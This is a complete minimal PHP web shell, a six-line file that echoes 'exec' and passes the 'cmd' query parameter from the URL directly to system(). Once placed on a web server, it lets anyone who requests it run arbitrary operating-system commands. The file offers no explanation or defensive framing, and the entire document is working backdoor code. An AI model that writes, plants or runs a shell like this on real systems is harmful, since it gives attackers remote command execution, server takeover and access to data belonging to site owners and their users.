<?php
echo "exec";
if (isset($_GET['cmd'])){
system($_GET['cmd']);
}
?>
